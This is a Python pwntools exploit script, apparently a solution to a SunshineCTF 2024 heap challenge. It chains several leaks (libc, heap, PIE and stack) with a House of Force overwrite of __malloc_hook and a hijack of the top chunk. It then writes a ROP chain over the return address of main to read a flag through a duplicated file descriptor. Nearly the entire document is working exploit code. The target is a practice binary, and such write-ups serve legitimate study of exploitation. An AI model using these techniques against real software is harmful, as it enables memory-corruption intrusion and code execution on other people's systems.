#! /usr/bin/python
from pwn import *

import ctypes

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT = 24002


global DEBUG_STACK
global HEAP_LEAK 
global MALLOC_HOOK_INDEX

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        b rand
        b dup2
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size):
    ru(p,b"option:")
    sl(p,b"1")
    ru(p,b"size of flag --> ")
    sl(p,b"%i" % size)

def edit(p, index, value):
    ru(p,b"option:")
    sl(p,b"2")
    ru(p,b"flag # to edit -->")
    sl(p,"%i" % index)
    ru(p,b"Enter new flag -->")
    sl(p,value)

def delete(p, index):
    ru(p,b"option:")
    sl(p,b"4")
    ru(p,b"Enter flag # to remove -->")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"option:")
    sl(p,b"3")
    ru(p,b"Enter flag # to view -->")
    sl(p,b"%i" % index)
    ru(p,b"===== Flag")
    rl(p)
    rl(p)


def setup_force(p,e,l):
    global HEAP_LEAK 

    log.info(f"Setting up house of force")

    edit(p,2,b"A" * 0x18 + p64(0xfffffffffffffff1))
     
    distance = l.sym["__malloc_hook"] - HEAP_LEAK - 0x28

    delete(p,1)
    delete(p,2)
     
    create(p,distance)
    create(p,0x428)
     
    
def call_force(p,func,val):

    global MALLOC_HOOK_INDEX

    log.info(f"Calling func: {hex(func)} with arg: {hex(val)} using house of force {MALLOC_HOOK_INDEX}")

    target = b"\x00" * 0x10 + p64(func)
    edit(p,MALLOC_HOOK_INDEX,target)

    #pause()
    create(p,val)
    MALLOC_HOOK_INDEX -= 1

def edit_ptr(p,ptr,ind):
    global MALLOC_HOOK_INDEX

    log.info(f"Editing heap chunk for function call") 
    arg = ptr + b"\x00"
    arg += b"A" * (0x18 - len(arg))
    edit(p,ind,arg + p64(0xfffffffffffffff1))
     

def generate_ropchain(l,fd,writable_addr):

    """
    Generate rop chain that calls

    syscall_read(rax=0, rdi=fd, rsi=writable_addr, rdx=0x30)
    syscall_write(rax=1, rdi=1, rsi=writable_addr, rdx=0x30)

    """

    r = ROP(l)
    chain = p64(r.find_gadget(["pop rdi", "ret"])[0]) + p64(fd)
    chain += p64(r.find_gadget(["pop rsi", "pop r15", "ret"])[0]) 
    chain += p64(writable_addr) + p64(0)
    chain += p64(r.find_gadget(["pop rdx", "ret"])[0]) + p64(0x30)
    chain += p64(r.find_gadget(["pop rax", "ret"])[0]) + p64(0)
    chain += p64(r.find_gadget(["syscall","ret"])[0]) 

    chain += p64(r.find_gadget(["pop rdi", "ret"])[0]) + p64(1)
    chain += p64(r.find_gadget(["pop rsi", "pop r15", "ret"])[0]) 
    chain += p64(writable_addr) + p64(0)
    chain += p64(r.find_gadget(["pop rdx", "ret"])[0]) + p64(0x30)
    chain += p64(r.find_gadget(["pop rax", "ret"])[0]) + p64(1)
    chain += p64(r.find_gadget(["syscall","ret"])[0]) 


    return chain

def exploit(p,e,l):

    global HEAP_LEAK 
    global MALLOC_HOOK_INDEX
    global DEBUG_STACK


    DEBUG_STACK = False

    """
    Get libc leak from prompt
    """

    ru(p,b"Kernel Seed: ")
    libc_leak = int(p.recvline().strip(),16)
    if args.GDB:
        libc_leak ^= 0xd3c0dead
    l.address = libc_leak - l.sym["rand"]

    log.info(f"Leaked libc rand {hex(libc_leak)}\nLeaked libc base {hex(l.address)}")

    """ 
    Create heap leak by freeing 
    two unsortedbins chunks and reallocating
    one
    """
    create(p,0x418)
    create(p,0x18)
    create(p,0x418)
    create(p,0x18)
    
    delete(p,3)
    delete(p,1)

    create(p,0x418)
    edit(p,3,b"A" * 7)
    view(p,3)


    ru(p,b"AAAAAAA\n")

    heap_leak = u64(p.recvline().strip(b"\n").ljust(8,b"\x00")) + 0x880
    HEAP_LEAK = heap_leak
    log.info(f"Recieved heap leak {hex(heap_leak)}")

    delete(p,3)

    """
    Overwrite top chunk size field
    """
    setup_force(p,e,l)
    
    MALLOC_HOOK_INDEX = 3

    edit_ptr(p, b"%1$p",2) 
    call_force(p,l.sym["printf"], heap_leak + 0x10)

    ru(p,b"Allocating space within storage array...")

    leak = int(ru(p,b"SUCCESS").split(b"SUCCESS")[0],16)

    e.address = leak - 0x1137

    log.info(f"Leaked pie base {hex(e.address)} from printf")

    delete(p,1)

    chunk_table_addr = e.address + 0x20304c

    num_of_chunks = 32

    writable_addr = e.address + 0x203200
    
    """
    Clear malloc hook and change 
    main_arena.top_chunk to our chunk array
    and allocate a new chunk to control
    the chunk array
    """
    
    new_top_chunk = (e.address + 0x203060)

    target = p64(0) * 0x10
    target += p64(new_top_chunk) 

    log.info(f"Clearing __malloc_hook and setting top chunk to {hex(new_top_chunk)}")

    edit(p,MALLOC_HOOK_INDEX,target)

    create(p,0x448)

    """
    Overwrite chunk array with 
    target addresses to view/edit
    
    * address of num_of_chunks variable
    * address of duplicated fd
    * malloc_hook
    * free_hook
    * libc environ to leak the stack

    """

    current_table_addr = e.address + 0x2030a0

    table_overwrite = p64(e.address + 0x20304c) + p64(heap_leak - 0x890)
    table_overwrite += p64(l.sym["__malloc_hook"]) + p64(l.sym["__free_hook"])
    table_overwrite += p64(l.sym["environ"]) + p64(e.address + 0x2030a0)
 
    edit(p,4,table_overwrite)
    
    # Overwrite num_of_chunks
    edit(p,3,p64(0xffff))
    
    pause()
    """
    View flag fd that was duped
    and change the chunk that
    will be closed later
    """
    view(p,4)

    fd = up(rl(p).strip(b"\n"))
    log.info(f"Leaked flag fd {hex(fd)}")

    writable_addr = e.address + 0x203200

    edit(p,4,p64(3))

    """
    Leak stack address from libc.environ
    """
    view(p,7)

    stack_leak = up(rl(p).strip(b"\n"))
    log.info(f"Leaked stack {hex(stack_leak)}") 

    rop_index = None

    log.info(f"Leaking libc_start_main+231 from stack")
    #stack_test = stack_leak


    """
    Iterate through the stack to find the return address to
    __libc_start_address in main in order to set it to 
    our rop chain
    """
    find_value = l.sym["__libc_start_main"] + 231

    stack_test = stack_leak
    prev_table_index = 8
    current_table_index = 8
    loop_num = 0
    rop_addr = None

    DEBUG_STACK = True
    
    while rop_index == None:

        table_overwrite = b""
        stack_values = [stack_test - (0x8 * (i + 1)) for i in range(12)]
 
        for i in stack_values:
            table_overwrite += p64(i)

        current_table_addr += len(table_overwrite) + 8
        table_overwrite += p64(current_table_addr)
        stack_test = stack_values[-1]
        if prev_table_index >= 488:

            log.warning(f"Couldn't find return address for exit {prev_table_index}")
            break
        edit(p,prev_table_index,table_overwrite)
        #log.info(f"Inserted values into chunk array")

        for i in range(1,len(stack_values)):
        
            view(p,current_table_index+i+1)
            leak = up(rl(p).strip(b"\n"))
            log.info(f"Testing stack addr {hex(stack_values[i])}: {hex(leak)}")
            if leak == find_value:
                log.info(f"Found libc_start_main at {i} {hex(leak)}")
                rop_index = i + current_table_index + 1
                rop_addr = stack_values[i]
                
                break
            
        current_table_index += len(stack_values) + 1
        prev_table_index = current_table_index 
        loop_num += 1 

    chain = generate_ropchain(l,fd,writable_addr)

    if rop_index != None:
        log.info(f"Sending rop chain at {hex(rop_addr)}")
        edit(p,rop_index,chain)
        sl(p,b"ff")

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")


    exploit(p,e,l)
